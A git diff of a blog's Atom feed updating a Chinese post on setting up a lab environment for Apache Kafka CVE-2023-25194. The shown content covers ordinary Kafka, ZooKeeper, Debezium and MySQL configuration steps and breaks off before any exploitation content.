@@ -3,11 +3,11 @@
     <id>https://my011215.github.io</id>
     <title>blog小窝 • Posts by &#34;web安全&#34; category</title>
     <link href="https://my011215.github.io" />
-    <updated>2023-12-04T03:12:30.000Z</updated>
+    <updated>2023-12-05T03:12:30.000Z</updated>
     <entry>
-        <id>https://my011215.github.io/2023/12/04/Penetration%20testing/Apache-Kafka-CVE-2023-25194-JNDI%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA+%E6%B5%85%E6%9E%90/</id>
+        <id>https://my011215.github.io/2023/12/05/Penetration%20testing/Apache-Kafka-CVE-2023-25194-JNDI%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA+%E6%B5%85%E6%9E%90/</id>
         <title>Apache Kafka CVE-2023-25194 JNDI注入漏洞环境搭建+浅析</title>
-        <link rel="alternate" href="https://my011215.github.io/2023/12/04/Penetration%20testing/Apache-Kafka-CVE-2023-25194-JNDI%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA+%E6%B5%85%E6%9E%90/"/>
+        <link rel="alternate" href="https://my011215.github.io/2023/12/05/Penetration%20testing/Apache-Kafka-CVE-2023-25194-JNDI%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA+%E6%B5%85%E6%9E%90/"/>
         <content type="html">&lt;!-- toc --&gt;
 &lt;ul&gt;
 &lt;li&gt;&lt;a href=&#34;#%E4%BB%8B%E7%BB%8D&#34;&gt;介绍&lt;/a&gt;&lt;/li&gt;
@@ -19,6 +19,10 @@
 &lt;li&gt;&lt;a href=&#34;#%E5%BC%80%E5%90%AF%E6%97%85%E9%80%94&#34;&gt;开启旅途&lt;/a&gt;&lt;/li&gt;
 &lt;/ul&gt;
 &lt;/li&gt;
+&lt;li&gt;&lt;a href=&#34;#%E6%BC%8F%E6%B4%9E%E6%A3%80%E6%B5%8B&#34;&gt;漏洞检测&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href=&#34;#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8&#34;&gt;漏洞利用&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href=&#34;#%E4%BF%AE%E5%A4%8D%E5%BB%BA%E8%AE%AE&#34;&gt;修复建议&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href=&#34;#%E6%84%9F%E8%B0%A2&#34;&gt;感谢&lt;/a&gt;&lt;/li&gt;
 &lt;/ul&gt;
 &lt;!-- tocstop --&gt;
 &lt;span id=&#34;more&#34;&gt;&lt;/span&gt;  
@@ -76,11 +80,132 @@ PS：注意 java 版本和 debezium 版本冲突问题。&lt;/li&gt;
 &lt;img src=&#34;https://github.com/my011215/my011215.github.io/blob/main/image/446.png?raw=true&#34; alt&gt;&lt;/p&gt;
 &lt;/li&gt;
 &lt;li&gt;
-&lt;p&gt;启动服务端&lt;/p&gt;
+&lt;p&gt;启动服务端（zookeeper）&lt;br&gt;
+可能会出现报错，所以可以先编辑 zookeep 文件 bin 目录下的 zkserver.cmd 文件。在 endlocal 前面加上 pause，暂停命令框（避免遇到错误直接闪退），查看报错结果。&lt;/p&gt;
 &lt;/li&gt;
 &lt;/ol&gt;
+&lt;ul&gt;
+&lt;li&gt;
+&lt;p&gt;由于旧版本原因，命名不一致。&lt;br&gt;
+更改 conf 目录下的 zoo_sample.cfg 文件名为：zoo.cfg&lt;br&gt;
+&lt;img src=&#34;https://github.com/my011215/my011215.github.io/blob/main/image/447.png?raw=true&#34; alt&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;报错：Exiting JVM with code 4&lt;br&gt;
+ 在 conf 目录下的 zoo.cfg 末尾加上&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;admin.enableServer=false&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;admin.serverPort=17900&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;ul&gt;
+&lt;li&gt;启动服务端&lt;br&gt;
+双击 zookeep 文件 bin 目录下的 zkserver.cmd 文件，可以看到顺利启动不报错。&lt;br&gt;
+&lt;img src=&#34;https://github.com/my011215/my011215.github.io/blob/main/image/448.png?raw=true&#34; alt&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;ol start=&#34;3&#34;&gt;
+&lt;li&gt;修改 kafka 日志存放路径&lt;br&gt;
+编辑 Kafka/config/server.properties 文件&lt;br&gt;
+&lt;img src=&#34;https://github.com/my011215/my011215.github.io/blob/main/image/449.png?raw=true&#34; alt&gt;&lt;/li&gt;
+&lt;/ol&gt;
+&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;# A comma separated list of directories under which to store log files&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;log.dirs=D:\kafa\kafka_2.13-2.5.0\kafa-logs&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;ol start=&#34;4&#34;&gt;
+&lt;li&gt;启动客户端 kafka&lt;br&gt;
+ 命令启动&lt;/li&gt;
+&lt;/ol&gt;
+&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;.\bin\windows\kafka-server-start.bat .\config\server.properties&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;p&gt;&lt;img src=&#34;https://github.com/my011215/my011215.github.io/blob/main/image/450.png?raw=true&#34; alt&gt;&lt;/p&gt;
+&lt;ol start=&#34;5&#34;&gt;
+&lt;li&gt;测试 kafa 搭建&lt;/li&gt;
+&lt;/ol&gt;
+&lt;ul&gt;
+&lt;li&gt;创建 topic&lt;br&gt;
+ 感觉这个思想和创建队列类似吧～&lt;/li&gt;
+&lt;/ul&gt;
+&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;.\bin\windows\kafka-topics.bat --create --bootstrap-server localhost:9092 --replication-factor 1 --partitions 1 --topic tests&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;p&gt;这里要注意，创建重复名字的 topic 会导致报错。&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://github.com/my011215/my011215.github.io/blob/main/image/451.png?raw=true&#34; alt&gt;&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;查询主题&lt;/li&gt;
+&lt;/ul&gt;
+&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;.\bin\windows\kafka-topics.bat --list --bootstrap-server localhost:9092&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;p&gt;&lt;img src=&#34;https://github.com/my011215/my011215.github.io/blob/main/image/452.png?raw=true&#34; alt&gt;&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;创建生产者&lt;/li&gt;
+&lt;/ul&gt;
+&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;.\bin\windows\kafka-console-producer.bat --broker-list localhost:9092 --topic tests&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;ul&gt;
+&lt;li&gt;创建消费者&lt;/li&gt;
+&lt;/ul&gt;
+&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;.\bin\windows\kafka-console-consumer.bat --bootstrap-server localhost:9092 --topic tests --from-beginning&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;p&gt;&lt;img src=&#34;https://github.com/my011215/my011215.github.io/blob/main/image/453.png?raw=true&#34; alt&gt;&lt;/p&gt;
+&lt;p&gt;生产者生产了数据，消费者也能接收到，类似队列。&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;启动 connect&lt;/li&gt;
+&lt;/ul&gt;
+&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;.\bin\windows\connect-standalone.bat .\config\connect-standalone.properties .\config\connect-file-source.properties .\config\connect-file-sink.properties&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;p&gt;&lt;img src=&#34;https://github.com/my011215/my011215.github.io/blob/main/image/454.png?raw=true&#34; alt&gt;&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;访问 connector-plugins&lt;br&gt;
+&lt;img src=&#34;https://github.com/my011215/my011215.github.io/blob/main/image/455.png?raw=true&#34; alt&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;ol start=&#34;6&#34;&gt;
+&lt;li&gt;配置 Debezium MySQL 连接器&lt;br&gt;
+将 debezium 中的 jar 包选中复制到 kafka 的 libs 目录下&lt;/li&gt;
+&lt;/ol&gt;
+&lt;p&gt;&lt;img src=&#34;https://github.com/my011215/my011215.github.io/blob/main/image/456.png?raw=true&#34; alt&gt;&lt;/p&gt;
+&lt;p&gt;修改包路径&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;conf 目录下 connect-standalone 和 connect-distributed 文件增加如下内容&lt;/li&gt;
+&lt;/ul&gt;
+&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;plugin.path=D:\kafa\kafka_2.13-2.5.0\libs&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;ul&gt;
+&lt;li&gt;修改配置文件 server.properties&lt;br&gt;
+&lt;img src=&#34;https://github.com/my011215/my011215.github.io/blob/main/image/457.png?raw=true&#34; alt&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;ol start=&#34;7&#34;&gt;
+&lt;li&gt;mysql 数据同步配置&lt;br&gt;
+ windows 下是 my.ini 文件&lt;/li&gt;
+&lt;/ol&gt;
+&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;[mysqld]&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;# The TCP/IP Port the MySQL Server will listen on&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;port=3306&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;server-id=7778&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;log_bin=mysql501-bin&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;binlog_format=ROW&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;#binlog_row_image=FULL&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;expire_logs_days=10&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;p&gt;binlog_row_image=FULL 需要注释，mysql5 还不支持。&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;重启 mysql 服务&lt;/li&gt;
+&lt;li&gt;创建用户并赋予相关权限（也可以使用 root 用户）&lt;/li&gt;
+&lt;li&gt;创建表并插入数据&lt;/li&gt;
+&lt;/ul&gt;
+&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;create database school;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;use school;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;create table student (name varchar(20),age int);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;insert into student values(&amp;#x27;tom&amp;#x27;,18),(&amp;#x27;jack&amp;#x27;,19),(&amp;#x27;lisa&amp;#x27;,18);&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;ul&gt;
+&lt;li&gt;新增 connector 连接器实例&lt;br&gt;
+发送数据包，这里使用 postman 做演示&lt;/li&gt;
+&lt;/ul&gt;
+&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;quot;name&amp;quot;: &amp;quot;mysql-connectors1&amp;quot;, #自定义连接器实例名&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;quot;config&amp;quot;:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &amp;quot;connector.class&amp;quot;: &amp;quot;io.debezium.connector.mysql.MySqlConnector&amp;quot;, #连接器类库&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &amp;quot;database.hostname&amp;quot;: &amp;quot;localhost&amp;quot;, #mysql地址&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &amp;quot;database.port&amp;quot;: &amp;quot;3306&amp;quot;, #mysql端口号&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &amp;quot;database.user&amp;quot;: &amp;quot;debezium&amp;quot;,  #用户名&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &amp;quot;database.password&amp;quot;: &amp;quot;dbz&amp;quot;, #密码&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &amp;quot;database.server.id&amp;quot;: &amp;quot;7777&amp;quot;,  #对应mysql中的server-id的配置。&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &amp;quot;database.server.name&amp;quot;: &amp;quot;cr7-demo&amp;quot;, #逻辑名称，每个connector确保唯一，作为写入数据的kafka topic的前缀名称&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &amp;quot;database.history.kafka.bootstrap.servers&amp;quot;: &amp;quot;localhost:9092&amp;quot;, #kafka集群地址&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &amp;quot;database.history.kafka.topic&amp;quot;: &amp;quot;cr7-schema-changes-inventory&amp;quot;, #存储数据库的Shcema的记录信息，而非写入数据的topic&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &amp;quot;include.schema.changes&amp;quot;: &amp;quot;true&amp;quot;,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &amp;quot;database.whitelist&amp;quot;: &amp;quot;school&amp;quot;, #待同步的mysql数据库名&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &amp;quot;table.whitlelist&amp;quot;: &amp;quot;student&amp;quot; #待同步的mysq表名&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;  &lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;p&gt;响应包&lt;/p&gt;
+&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;25&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;quot;name&amp;quot;: &amp;quot;mysql-connectors1&amp;quot;,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;quot;config&amp;quot;: &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &amp;quot;connector.class&amp;quot;: &amp;quot;io.debezium.connector.mysql.MySqlConnector&amp;quot;,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &amp;quot;database.hostname&amp;quot;: &amp;quot;localhost&amp;quot;,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &amp;quot;database.port&amp;quot;: &amp;quot;3306&amp;quot;,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &amp;quot;database.user&amp;quot;: &amp;quot;debezium&amp;quot;,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &amp;quot;database.password&amp;quot;: &amp;quot;dbz&amp;quot;,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &amp;quot;database.server.id&amp;quot;: &amp;quot;7777&amp;quot;,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &amp;quot;database.server.name&amp;quot;: &amp;quot;cr7-demo&amp;quot;,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &amp;quot;database.history.kafka.bootstrap.servers&amp;quot;: &amp;quot;localhost:9092&amp;quot;,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &amp;quot;database.history.kafka.topic&amp;quot;: &amp;quot;cr7-schema-changes-inventory&amp;quot;,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &amp;quot;include.schema.changes&amp;quot;: &amp;quot;true&amp;quot;,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &amp;quot;database.whitelist&amp;quot;: &amp;quot;school&amp;quot;,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &amp;quot;table.whitlelist&amp;quot;: &amp;quot;student&amp;quot;,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &amp;quot;name&amp;quot;: &amp;quot;mysql-connectors1&amp;quot;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;quot;tasks&amp;quot;: [&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &amp;quot;connector&amp;quot;: &amp;quot;mysql-connectors&amp;quot;,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &amp;quot;task&amp;quot;: 0&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    ],&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;quot;type&amp;quot;: &amp;quot;source&amp;quot;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;ul&gt;
+&lt;li&gt;查看连接器实例运行状态&lt;/li&gt;
+&lt;/ul&gt;
+&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;http://locolhost:8083/connectors/mysql-connectors1/status&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;p&gt;其中 mysql-connectors1 是前面 name 的名字&lt;br&gt;
+响应包&lt;/p&gt;
+&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span 